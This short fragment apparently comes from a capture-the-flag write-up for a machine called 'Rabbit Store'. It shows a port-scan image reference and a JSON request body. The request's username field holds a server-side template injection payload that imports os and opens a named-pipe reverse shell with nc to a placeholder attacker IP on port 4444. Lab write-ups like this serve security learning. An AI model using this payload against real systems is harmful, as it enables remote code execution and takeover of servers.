...
![nmap](/assets/images/writeups/rabbit_store/rabbit_store_1.png)
...
```
{"username":"[two-curley opening braces here]self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <attacker-ip> 4444 >/tmp/f').read() [two-curley closing braces here]"}
```
